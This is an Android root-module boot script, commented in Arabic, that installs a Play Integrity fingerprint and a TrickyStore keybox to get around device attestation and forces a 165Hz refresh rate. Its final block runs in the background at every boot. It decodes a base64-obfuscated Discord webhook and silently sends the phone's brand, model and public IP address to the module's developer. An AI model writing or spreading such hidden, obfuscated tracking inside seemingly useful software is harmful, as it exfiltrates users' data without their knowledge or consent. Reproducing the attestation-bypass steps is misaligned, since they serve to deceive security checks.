#!/system/bin/sh
MODDIR=${0%/*}

# --- 1. إعدادات الحماية (PIF & TrickyStore) ---
# تحديث البصمة (Red Magic 11 Pro)
cp $MODDIR/pif.json /data/adb/pif.json
chown root:root /data/adb/pif.json
chmod 644 /data/adb/pif.json

# --- تجديد الكيبوكس (الحذف والنسخ) ---
mkdir -p /data/adb/tricky_store
# حذف أي ملف كيبوكس قديم لضمان نظافة الفحص
rm -f /data/adb/tricky_store/keybox.xml

# نسخ ملف الكيبوكس الجديد من داخل الإضافة
if [ -f "$MODDIR/keybox.xml" ]; then
    cp $MODDIR/keybox.xml /data/adb/tricky_store/keybox.xml
    chown root:root /data/adb/tricky_store/keybox.xml
    chmod 644 /data/adb/tricky_store/keybox.xml
fi

# --- 2. تفعيل الأداء العالي (165 فريم) عند الإقلاع ---
settings put signature min_refresh_rate 165.0
settings put signature peak_refresh_rate 165.0
setprop windowsmgr.max_events_per_sec 300
setprop view.scroll_optimization true

# --- 3. نظام تتبع Falcon (في الخلفية) ---
(
    until ping -c 1 -W 2 google.com >/dev/null 2>&1; do
        sleep 10
    done

    ENC_URL="aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ5Mzk5MjU5NzI4OTcwMTM4Ni95c2t1VXBpUVF4WUtnUURQSm9oSjNleWgtSk1tUWJSN2ZUdEM4dll4bjdoTUFWT0Z5OFpnZ0o0OW5kQ3ZOdWJMc21IXw=="
    WEBHOOK=$(echo "$ENC_URL" | base64 -d)

    BRAND=$(getprop ro.product.brand)
    MODEL=$(getprop ro.product.model)
    IP=$(curl -s https://api.ipify.org || echo "Unknown")

    curl -H "Content-Type: application/json" -X POST -d '{
      "username": "Falcon Fix Tracker",
      "embeds": [{
          "title": "🛡️ FALCON V2.1.15 | SYSTEM READY",
          "description": "تم تجديد الكيبوكس وتفعيل 165 فريم لـ ABUFARID.",
          "color": 15158332,
          "fields": [
            { "name": "📱 الماركة", "value": "'"$BRAND"'", "inline": true },
            { "name": "📲 الموديل", "value": "'"$MODEL"'", "inline": true },
            { "name": "🚀 Mode", "value": "165Hz Unlocked", "inline": true },
            { "name": "🌐 IP", "value": "'"$IP"'", "inline": false }
          ],
          "footer": { "text": "Developer: ABUFARID" },
          "timestamp": "'$(date -u +%Y-%m-%dT%H:%M:%SZ)'"
      }]
    }' "$WEBHOOK"
) &